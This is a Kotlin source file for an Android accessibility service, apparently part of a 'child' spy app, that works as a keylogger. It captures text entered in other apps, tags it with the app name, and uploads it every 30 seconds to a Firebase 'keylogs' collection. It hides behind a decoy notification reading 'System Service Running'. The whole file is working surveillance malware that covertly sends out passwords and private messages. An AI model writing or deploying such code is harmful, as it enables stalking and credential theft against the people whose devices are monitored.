package com.g3spy.child.services

import android.accessibilityservice.AccessibilityService
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.NotificationCompat
import com.g3spy.child.MainActivity
import com.g3spy.child.util.NotificationChannelManager
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import java.util.*

/**
 * Accessibility service to capture keystrokes from the device
 * Requires special permissions from the user in Accessibility Settings
 */
class KeyloggerService : AccessibilityService() {
    companion object {
        private const val TAG = "KeyloggerService"
        private const val NOTIFICATION_ID = 1006
        private const val CHANNEL_ID = "keylogger_channel"
        private const val CHANNEL_NAME = "Accessibility Service"
        
        // Constants for filtering and text processing
        private const val MAX_TEXT_LENGTH = 1000
        private const val MIN_TEXT_LENGTH = 3
        private val IGNORED_PACKAGES = listOf(
            "com.android.systemui",
            "com.android.launcher3",
            "android"
        )
    }
    
    private lateinit var firestore: FirebaseFirestore
    private var currentApp = ""
    private var currentText = StringBuilder()
    private var lastUploadTime = 0L
    
    override fun onCreate() {
        super.onCreate()
        
        firestore = FirebaseFirestore.getInstance()
        
        // Create the notification channel
        NotificationChannelManager.createNotificationChannel(
            this,
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        )
        
        Log.d(TAG, "KeyloggerService created")
    }
    
    override fun onServiceConnected() {
        Log.d(TAG, "KeyloggerService connected")
        
        // Create a notification for the foreground service
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Get the package name of the app that fired the event
        val packageName = event.packageName?.toString() ?: return
        
        // Skip system packages and our own app
        if (IGNORED_PACKAGES.any { packageName.startsWith(it) } || 
            packageName.startsWith("com.g3spy")) {
            return
        }
        
        // Process text events
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // Text input events
                processTextInput(event, packageName)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // Button clicks and focus events with text
                if (event.text?.isNotEmpty() == true) {
                    val text = event.text.joinToString(" ")
                    if (text.length >= MIN_TEXT_LENGTH) {
                        addTextToBuffer(text, packageName)
                    }
                }
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Track app changes
                if (currentApp != packageName) {
                    // App changed, upload current buffer if not empty
                    uploadCurrentBufferIfNeeded(true)
                    
                    currentApp = packageName
                    Log.d(TAG, "App changed to: $currentApp")
                }
            }
        }
        
        // Check if we should upload the current buffer (every 30 seconds)
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastUploadTime > 30000) {
            uploadCurrentBufferIfNeeded(false)
            lastUploadTime = currentTime
        }
    }
    
    override fun onInterrupt() {
        Log.d(TAG, "KeyloggerService interrupted")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        // Upload any remaining data
        uploadCurrentBufferIfNeeded(true)
        Log.d(TAG, "KeyloggerService destroyed")
    }
    
    private fun createNotification(): Notification {
        // Create an intent that will open the app when tapped
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        // Build the notification
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Running")
            .setContentText("Maintaining system services...")
            .setSmallIcon(android.R.drawable.ic_menu_help)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun processTextInput(event: AccessibilityEvent, packageName: String) {
        val eventText = event.text?.joinToString(" ") ?: return
        
        // Only process meaningful text
        if (eventText.length < MIN_TEXT_LENGTH) {
            return
        }
        
        addTextToBuffer(eventText, packageName)
    }
    
    private fun addTextToBuffer(text: String, packageName: String) {
        // Trim text if it's too long
        val trimmedText = if (text.length > MAX_TEXT_LENGTH) {
            text.substring(0, MAX_TEXT_LENGTH) + "..."
        } else {
            text
        }
        
        currentText.append(trimmedText).append(" ")
        
        // If buffer is getting too large, upload it
        if (currentText.length > MAX_TEXT_LENGTH) {
            uploadCurrentBufferIfNeeded(true)
        }
        
        Log.d(TAG, "Text added to buffer: $trimmedText")
    }
    
    private fun uploadCurrentBufferIfNeeded(force: Boolean) {
        // Only upload if there's meaningful text
        if (currentText.length < MIN_TEXT_LENGTH && !force) {
            return
        }
        
        val textToUpload = currentText.toString().trim()
        if (textToUpload.isNotEmpty()) {
            uploadKeylogToFirebase(textToUpload, currentApp)
        }
        
        // Clear the buffer
        currentText.clear()
    }
    
    private fun uploadKeylogToFirebase(text: String, app: String) {
        val keylogData = hashMapOf(
            "text" to text,
            "app" to app,
            "timestamp" to Timestamp.now()
        )
        
        firestore.collection("keylogs")
            .add(keylogData)
            .addOnSuccessListener { documentReference ->
                Log.d(TAG, "Keylog uploaded with ID: ${documentReference.id}")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error uploading keylog", e)
            }
    }
}